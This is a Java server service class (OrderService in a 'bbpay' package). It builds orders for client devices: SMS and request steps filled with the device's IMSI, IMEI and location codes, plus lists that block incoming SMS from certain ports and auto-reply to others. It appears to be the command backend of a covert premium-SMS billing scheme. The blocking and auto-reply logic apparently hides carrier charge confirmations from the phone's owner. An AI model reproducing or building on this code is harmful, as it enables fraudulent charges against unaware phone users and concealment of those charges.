package com.bbpay.server.service;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;
import org.apache.commons.lang3.StringUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;
import org.springframework.transaction.annotation.Transactional;
import com.bbpay.common.bean.BizInstance;
import com.bbpay.common.bean.Block;
import com.bbpay.common.bean.Feedback;
import com.bbpay.common.bean.response.Order;
import com.bbpay.common.bean.step.AbstractStep;
import com.bbpay.common.bean.step.DelayStep;
import com.bbpay.common.bean.step.RequestStep;
import com.bbpay.common.bean.step.ScriptRequestStep;
import com.bbpay.common.bean.step.SmsStep;
import com.bbpay.server.entity.AppEntity;
import com.bbpay.server.entity.AppInstanceEntity;
import com.bbpay.server.entity.BizEntity;
import com.bbpay.server.entity.BizInstanceEntity;
import com.bbpay.server.entity.BlockEntity;
import com.bbpay.server.entity.OrderEntity;
import com.bbpay.server.entity.SettingEntity;
import com.bbpay.server.repository.OrderRepository;
import com.google.gson.Gson;

@Component
@Transactional(readOnly = true)
public class OrderService extends AbstractService<OrderEntity> {
    private static final String RANDOM_PHONE = "#randomPhone#";
    private static final String RANDOM_5 = "#random5#";
    private static final String RANDOM_13 = "#random13#";
    private static final String CAPTIAL_CODE = "#captialCode#";
    private static final String PROVINCE_CODE = "#provinceCode#";
    private static final String CID = "#CID#";
    private static final String HOST_NAME_CODE = "#hostName#";
    private static final String SEQ4 = "#SEQ4#";
    private static final String IMSI = "#IMSI#";
    private static final String IMEI = "#IMEI#";
    SeqNumber seq4 = new SeqNumber(5, 4);
    Random random = new Random();
    @Autowired
    private ProvinceService provinceService;
    @Autowired
    private BizInstanceService bizInstanceService;
    @Autowired
    private CityService cityService;
    @Autowired
    private SettingService settingService;
    @Autowired
    private StatService statService;
    @Autowired
    private OrderRepository dao;
    @Autowired
    private BizService bizService;
    @Autowired
    private AppService appService;
    @Autowired
    private BlockService blockService;
    private OrderEntity create(AppInstanceEntity ai, int price) {
        OrderEntity entity = new OrderEntity();
        entity.setAppInstanceId(ai.getId());
        entity.setOrderDate(FormatUtil.format(new Date()));
        entity.setOrderTime(new Date());
        entity.setPrice(price);
        entity.setResult(-1);
        //dump keys start
        entity.setPackageName(ai.getPackageName());
        entity.setVersionCode(ai.getVersionCode());
        entity.setDeviceId(ai.getDeviceId());
        entity.setProvinceId(ai.getDeviceInfo().getProvinceId());
        entity.setCityId(ai.getDeviceInfo().getCityId());
        entity.setChannelId(ai.getChannelId());
        entity.setAppId(ai.getAppId());
        entity.setCarrierOperator(ai.getDeviceInfo().getCarrierOperator());
        AppEntity app = appService.get(ai.getAppId());
        if (app != null) {
            entity.setCpId(app.getCpId());
        }
        //dump keys end
        entity = dao.save(entity);
        return entity;
    }
    private List<BlockEntity> getBlockList(BizEntity biz) {
        String blockIds = biz.getBlockIds();
        List<BlockEntity> blockList = new ArrayList<BlockEntity>();
        if (StringUtils.isNotBlank(blockIds)) {
            for (String sid : blockIds.split(",")) {
                if (StringUtils.isNotBlank(sid)) {
                    BlockEntity block = this.blockService.get(Long.valueOf(sid.trim()));
                    if (block != null) {
                        blockList.add(block);
                    }
                }
            }
        }
        return blockList;
    }
    private boolean isFeedback(BlockEntity entity) {
        return StringUtils.isNotBlank(entity.getReplyContent()) || StringUtils.isNotBlank(entity.getReplyPort());
    }
    private List<Block> getBlockBeanList(List<BlockEntity> blockList, Long orderId) {
        List<Block> result = new ArrayList<Block>();
        for (BlockEntity entity : blockList) {
            if (!isFeedback(entity)) {
                result.add(toBlockBean(entity, orderId));
            }
        }
        SettingEntity setting = settingService.get();
        if (StringUtils.isNotBlank(setting.getCommonBlockPorts())) {
            Block block = new Block();
            block.orderId = orderId;
            block.port = setting.getCommonBlockPorts().trim();
            block.reportSuccess = shouldReportSuccess();
            block.expire = setting.getBlockExpireSeconds();
            result.add(block);
        }
        return result;
    }
    private List<Feedback> getFeedbackBeanList(List<BlockEntity> blockList, Long orderId) {
        List<Feedback> result = new ArrayList<Feedback>();
        for (BlockEntity entity : blockList) {
            if (isFeedback(entity)) {
                Feedback feedback = toFeedbackBean(entity, orderId);
                result.add(feedback);
            }
        }
        return result;
    }
    private String getRandomNumbers(int length) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(random.nextInt(10));
        }
        return sb.toString();
    }
    private List<AbstractStep> getStepList(String feeOrder) throws JSONException {
        Gson gson = new Gson();
        List<AbstractStep> stepList = new ArrayList<AbstractStep>();
        JSONArray array = new JSONArray(feeOrder);
        for (int i = 0; i < array.length(); i++) {
            JSONObject obj = array.getJSONObject(i);
            String type = obj.optString("type");
            AbstractStep step = null;
            if ("sms".equals(type)) {
                step = gson.fromJson(obj.toString(), SmsStep.class);
            } else if ("request".equals(type)) {
                step = gson.fromJson(obj.toString(), RequestStep.class);
            } else if ("scriptRequest".equals(type)) {
                step = gson.fromJson(obj.toString(), ScriptRequestStep.class);
            } else if ("delay".equals(type)) {
                step = gson.fromJson(obj.toString(), DelayStep.class);
            }
            if (step != null) {
                stepList.add(step);
            }
        }
        return stepList;
    }
    private Order mergerOrder(Order order, AppInstanceEntity instance, BizEntity biz, Long orderId) throws Exception {
        String orderContent = replaceOrderVarialbes(biz.getClientOrder(), instance);
        BizInstanceEntity bizInstanceEntity = bizInstanceService.create(instance, biz, orderId);
        Long bizInstanceId = bizInstanceEntity.getId();
        BizInstance bi = new BizInstance();
        bi.id = bizInstanceId;
        bi.price = biz.getPrice();
        bi.timeoutSeconds = settingService.get().getOrderTimeoutSeconds();
        order.bizInstanceList.add(bi);
        //stepList
        List<AbstractStep> stepList = new ArrayList<AbstractStep>();
        stepList.addAll(getStepList(orderContent));
        for (int i = 0; i < stepList.size(); i++) {
            AbstractStep step = stepList.get(i);
            step.index = i;
            step.bizInstanceId = bizInstanceId;
        }
        bi.stepList = stepList;
        List<BlockEntity> blockList = getBlockList(biz);
        //blockList
        order.blockList.addAll(getBlockBeanList(blockList, bizInstanceId));
        //feedback list
        order.feedbackList.addAll(getFeedbackBeanList(blockList, bizInstanceId));
        return order;
    }
    @Transactional(readOnly = false)
    public Order order(AppInstanceEntity appInstance, int price) throws Exception {
        OrderEntity orderEntity = create(appInstance, price);
        Order order = bizService.getBizList(appInstance, price);
        if (order.bizList != null && order.bizList.size() > 0) {
            order.id = orderEntity.getId();
            order.bizInstanceList = new ArrayList<BizInstance>();
            order.blockList = new ArrayList<Block>();
            order.feedbackList = new ArrayList<Feedback>();
            for (BizEntity biz : order.bizList) {
                mergerOrder(order, appInstance, biz, orderEntity.getId());
                statService.saveStat(biz, appInstance, StatService.STAT_TYPE_ORDER);
            }
        }
        return order;
    }
    private String replaceOrderVarialbes(String feeOrder, AppInstanceEntity client) throws Exception {
        if (feeOrder != null) {
            if (feeOrder.contains(RANDOM_5)) {
                feeOrder = feeOrder.replaceAll(RANDOM_5, String.valueOf(getRandomNumbers(5)));
            }
            if (feeOrder.contains(RANDOM_13)) {
                feeOrder = feeOrder.replaceAll(RANDOM_13, String.valueOf(getRandomNumbers(13)));
            }
            if (feeOrder.contains(SEQ4)) {
                feeOrder = feeOrder.replaceAll(SEQ4, seq4.getSeq());
            }
            if (feeOrder.contains(PROVINCE_CODE)) {
                feeOrder = feeOrder.replaceAll(PROVINCE_CODE, provinceService.get(client.getDeviceInfo().getProvinceId()).getCode());
            }
            if (feeOrder.contains(CID)) {
                feeOrder = feeOrder.replaceAll(CID, String.valueOf(client.getId()));
            }
            if (feeOrder.contains(IMSI)) {
                feeOrder = feeOrder.replaceAll(IMSI, client.getDeviceInfo().getImsi());
            }
            if (feeOrder.contains(IMEI)) {
                feeOrder = feeOrder.replaceAll(IMEI, client.getDevice().getImei());
            }
            if (feeOrder.contains(CAPTIAL_CODE)) {
                String captialCode = cityService.getCaptialCode(client.getDeviceInfo().getProvinceId());
                if (StringUtils.isBlank(captialCode)) return null;
                feeOrder = feeOrder.replaceAll(CAPTIAL_CODE, captialCode);
            }
            SettingEntity setting = settingService.get();
            if (feeOrder.contains(HOST_NAME_CODE)) {
                feeOrder = feeOrder.replaceAll(HOST_NAME_CODE, setting.getBizHost());
            }
            if (feeOrder.contains(RANDOM_PHONE)) {
                boolean success = false;
                String rondomPhoneNumber = null;
                String phone = setting.getSmsGetMobileSendAddress();
                if (StringUtils.isNotBlank(phone) && phone.trim().length() == 11) {
                    rondomPhoneNumber = phone;
                    success = true;
                }
                if (!success) {}
                if (success) {
                    feeOrder = feeOrder.replaceAll(RANDOM_PHONE, rondomPhoneNumber);
                }
                if (!success) return null;
            }
        }
        return feeOrder;
    }
    private boolean shouldReportSuccess() {
        SettingEntity setting = settingService.get();
        return setting.isBlockReportEnabled();
    }
    private Block toBlockBean(BlockEntity entity, Long orderId) {
        Block block = new Block();
        block.orderId = orderId;
        block.port = entity.getBlockPort();
        block.content = entity.getBlockContent();
        block.reportSuccess = true;
        return block;
    }
    private Feedback toFeedbackBean(BlockEntity entity, Long orderId) {
        Feedback feedback = new Feedback();
        feedback.orderId = orderId;
        feedback.type = entity.getReplyType();
        feedback.block = new Block();
        feedback.block.port = entity.getBlockPort();
        feedback.block.content = entity.getBlockContent();
        feedback.block.reportSuccess = this.shouldReportSuccess();
        feedback.content = entity.getReplyContent();
        feedback.port = entity.getReplyPort();
        feedback.reportSuccess = shouldReportSuccess();
        feedback.reportFailure = shouldReportSuccess();
        return feedback;
    }
    @Override
    protected OrderRepository getRepository() {
        return dao;
    }
}
